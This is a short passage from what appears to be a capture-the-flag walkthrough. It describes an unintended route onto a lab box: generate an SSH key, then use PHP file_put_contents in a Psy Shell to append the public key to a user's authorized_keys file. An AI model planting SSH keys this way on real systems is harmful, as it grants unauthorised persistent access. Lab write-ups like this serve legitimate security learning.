## Unintended way to get root

After we know that we have write permissions on dali in the Psy Shell we have another way to get on the box.

We can create our own SSH key:

```markdown
ssh-keygen -f dali
```

Put the contents of the public key into _.ssh/authorized_keys_:

```markdown
file_put_contents("/home/dali/.ssh/authorized_keys","ssh-rsa AAAAB3Nza... root@kali", FILE_APPEND)
```

And now we can log into the box with SSH.
